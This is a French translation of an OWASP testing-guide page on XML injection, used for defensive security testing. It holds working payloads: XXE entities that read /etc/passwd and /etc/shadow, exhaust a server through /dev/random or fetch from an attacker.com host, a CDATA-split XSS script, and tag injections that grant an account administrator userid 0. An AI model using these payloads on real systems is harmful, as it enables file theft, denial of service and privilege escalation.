# Test pour l'injection XML

|ID          |
|------------|
|WSTG-INPV-07|

## Sommaire

Le test d'injection XML se produit lorsqu'un testeur tente d'injecter un document XML dans l'application. Si l'analyseur XML ne parvient pas à valider contextuellement les données, le test donnera un résultat positif.

Cette section décrit des exemples pratiques d'injection XML. Dans un premier temps, une communication de style XML sera définie et ses principes de fonctionnement expliqués. Ensuite, la méthode de découverte dans laquelle on essaie d'insérer des métacaractères XML. Une fois la première étape accomplie, le testeur disposera de quelques informations sur la structure XML, il sera donc possible d'essayer d'injecter des données et des balises XML (Tag Injection).

## Objectifs des tests

- Identifier les points d'injection XML.
- Évaluer les types d'exploits pouvant être atteints et leur gravité.

## Comment tester

Supposons qu'il existe une application Web utilisant une communication de style XML afin d'effectuer l'enregistrement des utilisateurs. Cela se fait en créant et en ajoutant un nouveau nœud `user>` dans un fichier `xmlDb`.

Supposons que le fichier xmlDB ressemble à ceci :

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<users>
    <user>
        <username>gandalf</username>
        <password>!c3</password>
        <userid>0</userid>
        <mail>gandalf@middleearth.com</mail>
    </user>
    <user>
        <username>Stefan0</username>
        <password>w1s3c</password>
        <userid>500</userid>
        <mail>Stefan0@whysec.hmm</mail>
    </user>
</users>
```

Lorsqu'un utilisateur s'enregistre en remplissant un formulaire HTML, l'application reçoit les données de l'utilisateur dans une requête standard, qui, par souci de simplicité, sera censée être envoyée sous la forme d'une requête `GET`.

Par exemple, les valeurs suivantes :

```txt
Username: tony
Password: Un6R34kb!e
E-mail: s4tan@hell.com
```

produira la requête :

`http://www.example.com/addUser.php?username=tony&password=Un6R34kb!e&email=s4tan@hell.com`

L'application construit alors le nœud suivant :

```xml
<user>
    <username>tony</username>
    <password>Un6R34kb!e</password>
    <userid>500</userid>
    <mail>s4tan@hell.com</mail>
</user>
```

qui sera ajouté à la xmlDB :

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<users>
    <user>
        <username>gandalf</username>
        <password>!c3</password>
        <userid>0</userid>
        <mail>gandalf@middleearth.com</mail>
    </user>
    <user>
        <username>Stefan0</username>
        <password>w1s3c</password>
        <userid>500</userid>
        <mail>Stefan0@whysec.hmm</mail>
    </user>
    <user>
    <username>tony</username>
    <password>Un6R34kb!e</password>
    <userid>500</userid>
    <mail>s4tan@hell.com</mail>
    </user>
</users>
```

### Découverte

La première étape pour tester une application pour la présence d'une vulnérabilité XML Injection consiste à essayer d'insérer des métacaractères XML.

Les métacaractères XML sont :

- Guillemet simple : `'` - Lorsqu'il n'est pas nettoyé, ce caractère peut générer une exception lors de l'analyse XML, si la valeur injectée va faire partie d'une valeur d'attribut dans une balise.

Par exemple, supposons qu'il existe l'attribut suivant :

`<node attrib='$inputValue'/>`

Alors, si :

`inputValue = foo'`

est instancié puis inséré en tant que valeur d'attribut :

`<node attrib='foo''/>`

alors, le document XML résultant n'est pas bien formé.

- Guillemet double : `"` - ce caractère a la même signification que le guillemet simple et peut être utilisé si la valeur de l'attribut est entourée de guillemets doubles.

`<node attrib="$inputValue"/>`

Alors, si :

`$inputValue = foo"`

la substitution donne :

`<node attrib="foo""/>`

et le document XML résultant n'est pas valide.

- Parenthèses angulaires : `>` et `<` - En ajoutant une parenthèse angulaire ouverte ou fermée dans une entrée utilisateur comme suit :

`Username = foo<`

l'application construira un nouveau nœud :

```xml
<user>
    <username>foo<</username>
    <password>Un6R34kb!e</password>
    <userid>500</userid>
    <mail>s4tan@hell.com</mail>
</user>
```

mais, à cause de la présence du '<' ouvert, le document XML résultant n'est pas valide.

- Balise de commentaire : `<!--/-->` - Cette séquence de caractères est interprétée comme le début/la fin d'un commentaire. Donc en injectant l'un d'eux dans le paramètre Username :

`Username = foo<!--`

l'application construira un nœud comme celui-ci :

```xml
<user>
    <username>foo<!--</username>
    <password>Un6R34kb!e</password>
    <userid>500</userid>
    <mail>s4tan@hell.com</mail>
</user>
```

qui ne sera pas une séquence XML valide.

- Esperluette : `&`- L'esperluette est utilisée dans la syntaxe XML pour représenter des entités. Le format d'une entité est `&symbol;`. Une entité est mappée à un caractère du jeu de caractères Unicode.

Par exemple:

`<tagnode>&lt;</tagnode>`

est bien formé et valide, et représente le caractère ASCII `<`.

Si `&` n'est pas lui-même encodé avec `&amp;`, il pourrait être utilisé pour tester l'injection XML.

En fait, si une entrée comme celle-ci est fournie :

`Username = &foo`

un nouveau nœud sera créé :

```xml
<user>
    <username>&foo</username>
    <password>Un6R34kb!e</password>
    <userid>500</userid>
    <mail>s4tan@hell.com</mail>
</user>
```

mais, encore une fois, le document n'est pas valide : `&foo` ne se termine pas par `;` et l'entité `&foo;` n'est pas définie.

- Délimiteurs de section CDATA : `<!\[CDATA\[ / ]]>` - Les sections CDATA sont utilisées pour échapper des blocs de texte contenant des caractères qui seraient autrement reconnus comme du balisage. En d'autres termes, les caractères inclus dans une section CDATA ne sont pas analysés par un analyseur XML.

Par exemple, s'il est nécessaire de représenter la chaîne `<foo>` à l'intérieur d'un nœud de texte, une section CDATA peut être utilisée :

```xml
<node>
    <![CDATA[<foo>]]>
</node>
```

de sorte que `<foo>` ne sera pas analysé comme un balisage et sera considéré comme une donnée de caractère.

Si un nœud est créé de la manière suivante :

`<username><![CDATA[<$userName]]></username>`

le testeur pourrait essayer d'injecter la chaîne CDATA de fin `]]>` afin d'essayer d'invalider le document XML.

`userName = ]]>`

cela deviendra :

`<username><![CDATA[]]>]]></username>`

qui n'est pas un fragment XML valide.

Un autre test est lié à la balise CDATA. Supposons que le document XML est traité pour générer une page HTML. Dans ce cas, les délimiteurs de section CDATA peuvent être simplement éliminés, sans inspecter davantage leur contenu. Ensuite, il est possible d'injecter des balises HTML, qui seront incluses dans la page générée, en contournant complètement les routines de nettoyage existantes.

Prenons un exemple concret. Supposons que nous ayons un nœud contenant du texte qui sera affiché à l'utilisateur.

```xml
<html>
    $HTMLCode
</html>
```

Ensuite, un attaquant peut fournir l'entrée suivante :

`$HTMLCode = <![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]>`

et obtenir le nœud suivant :

```xml
<html>
    <![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]>
</html>
```

Lors du traitement, les délimiteurs de section CDATA sont éliminés, générant le code HTML suivant :

```html
<script>
    alert('XSS')
</script>
```

Le résultat est que l'application est vulnérable à XSS.

Entité externe : l'ensemble des entités valides peut être étendu en définissant de nouvelles entités. Si la définition d'une entité est un URI, l'entité est appelée une entité externe. Sauf configuration contraire, les entités externes forcent l'analyseur XML à accéder à la ressource spécifiée par l'URI, par exemple, un fichier sur la machine locale ou sur un système distant. Ce comportement expose l'application aux attaques XML eXternal Entity (XXE), qui peuvent être utilisées pour effectuer un déni de service du système local, obtenir un accès non autorisé aux fichiers sur la machine locale, analyser des machines distantes et effectuer un déni de service de systèmes distants. .

Pour tester les vulnérabilités XXE, on peut utiliser l'entrée suivante :

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [ <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///dev/random" >]>
        <foo>&xxe;</foo>
```

Ce test peut planter le serveur Web (sur un système UNIX) si l'analyseur XML tente de remplacer l'entité par le contenu du fichier /dev/random.

D'autres tests utiles sont les suivants :

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [ <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>

<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [ <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///etc/shadow" >]><foo>&xxe;</foo>

<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [ <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>

<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [ <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "http://www.attacker.com/text.txt" >]><foo>&xxe;</foo>
```

### Injection de balises

Une fois la première étape accomplie, le testeur disposera de quelques informations sur la structure du document XML. Ensuite, il est possible d'essayer d'injecter des données et des balises XML. Nous montrerons un exemple de la façon dont cela peut conduire à une attaque par escalade de privilèges.

Considérons l'application précédente. En insérant les valeurs suivantes :

```txt
Username: tony
Password: Un6R34kb!e
E-mail: s4tan@hell.com</mail><userid>0</userid><mail>s4tan@hell.com
```

l'application construira un nouveau nœud et l'ajoutera à la base de données XML :

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<users>
    <user>
        <username>gandalf</username>
        <password>!c3</password>
        <userid>0</userid>
        <mail>gandalf@middleearth.com</mail>
    </user>
    <user>
        <username>Stefan0</username>
        <password>w1s3c</password>
        <userid>500</userid>
        <mail>Stefan0@whysec.hmm</mail>
    </user>
    <user>
        <username>tony</username>
        <password>Un6R34kb!e</password>
        <userid>500</userid>
        <mail>s4tan@hell.com</mail>
        <userid>0</userid>
        <mail>s4tan@hell.com</mail>
    </user>
</users>
```

Le fichier XML résultant est bien formé. De plus, il est probable que, pour l'utilisateur tony, la valeur associée à la balise userid soit celle apparaissant en dernier, c'est-à-dire 0 (l'ID administrateur). En d'autres termes, nous avons injecté un utilisateur avec des privilèges administratifs.

Le seul problème est que la balise userid apparaît deux fois dans le dernier nœud utilisateur. Souvent, les documents XML sont associés à un schéma ou à une DTD et seront rejetés s'ils ne s'y conforment pas.

Supposons que le document XML est spécifié par la DTD suivante :

```xml
<!DOCTYPE users [
    <!ELEMENT users (user+) >
    <!ELEMENT user (username,password,userid,mail+) >
    <!ELEMENT username (#PCDATA) >
    <!ELEMENT password (#PCDATA) >
    <!ELEMENT userid (#PCDATA) >
    <!ELEMENT mail (#PCDATA) >
]>
```

Notez que le nœud userid est défini avec la cardinalité 1. Dans ce cas, l'attaque que nous avons montrée précédemment (et d'autres attaques simples) ne fonctionnera pas si le document XML est validé par rapport à sa DTD avant tout traitement.

Cependant, ce problème peut être résolu, si le testeur contrôle la valeur de certains nœuds précédant le nœud incriminé (userid, dans cet exemple). En fait, le testeur peut commenter un tel nœud, en injectant une séquence de début/fin de commentaire :

```txt
Username: tony
Password: Un6R34kb!e</password><!--
E-mail: --><userid>0</userid><mail>s4tan@hell.com
```

Dans ce cas, la base de données XML finale est :

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<users>
    <user>
        <username>gandalf</username>
        <password>!c3</password>
        <userid>0</userid>
        <mail>gandalf@middleearth.com</mail>
    </user>
    <user>
        <username>Stefan0</username>
        <password>w1s3c</password>
        <userid>500</userid>
        <mail>Stefan0@whysec.hmm</mail>
    </user>
    <user>
        <username>tony</username>
        <password>Un6R34kb!e</password><!--</password>
        <userid>500</userid>
        <mail>--><userid>0</userid><mail>s4tan@hell.com</mail>
    </user>
</users>
```

Le nœud original `userid` a été commenté, ne laissant que celui injecté. Le document est désormais conforme à ses règles DTD.

## Examen du code source

L'API Java suivante peut être vulnérable à XXE si elle n'est pas configurée correctement.

```text
javax.xml.parsers.DocumentBuilder
javax.xml.parsers.DocumentBuildFactory
org.xml.sax.EntityResolver
org.dom4j.*
javax.xml.parsers.SAXParser
javax.xml.parsers.SAXParserFactory
TransformerFactory
SAXReader
DocumentHelper
SAXBuilder
SAXParserFactory
XMLReaderFactory
XMLInputFactory
SchemaFactory
DocumentBuilderFactoryImpl
SAXTransformerFactory
DocumentBuilderFactoryImpl
XMLReader
Xerces: DOMParser, DOMParserImpl, SAXParser, XMLParser
```

Vérifiez le code source si les entités docType, DTD externe et paramètre externe sont définies comme des utilisations interdites.

- [Aide-mémoire sur la prévention des entités externes XML (XXE)](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)

De plus, le lecteur Java POI office peut être vulnérable à XXE si la version est inférieure à 3.10.1.

La version de la bibliothèque POI peut être identifiée à partir du nom de fichier du JAR. Par exemple,

- `poi-3.8.jar`
- `poi-ooxml-3.8.jar`

Le mot clé de code source suivant peut s'appliquer à C.

- libxml2 : xmlCtxtReadMemory, xmlCtxtUseOptions, xmlParseInNodeContext, xmlReadDoc, xmlReadFd, xmlReadFile, xmlReadIO, xmlReadMemory, xmlCtxtReadDoc, xmlCtxtReadFd, xmlCtxtReadFile, xmlCtxtReadIO
- libxerces-c : XercesDOMParser, SAXParser, SAX2XMLReader

## Outils

- [Chaînes Fuzz d'injection XML (de l'outil wfuzz)] (https://github.com/xmendez/wfuzz/blob/master/wordlist/Injections/XML.txt)

## Références

- [Injection XML](https://www.whitehatsec.com/glossary/content/xml-injection)
- [Gregory Steuck, "attaque XXE (Xml eXternal Entity)"](https://www.securityfocus.com/archive/1/297714)
- [Aide-mémoire de prévention OWASP XXE] (https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
